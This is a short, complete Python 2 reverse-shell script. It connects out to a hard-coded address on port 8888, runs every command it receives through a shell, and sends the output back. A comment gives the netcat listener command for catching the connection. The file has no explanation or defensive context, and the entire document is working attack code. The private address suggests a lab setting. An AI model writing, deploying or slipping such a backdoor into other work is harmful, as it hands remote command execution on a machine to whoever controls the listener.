#!/usr/bin/python2.7
# To test run netcat with the command below
# nc -vlp 8888

import socket, subprocess

host = "10.0.2.15"
port = 8888

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

sock.connect((host,port))


while True:
    command = sock.recv(1024)
    proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    proc_result = proc.stdout.read() + proc.stderr.read()
    sock.send("Result of executing command {0} is {1}".format(command, proc_result))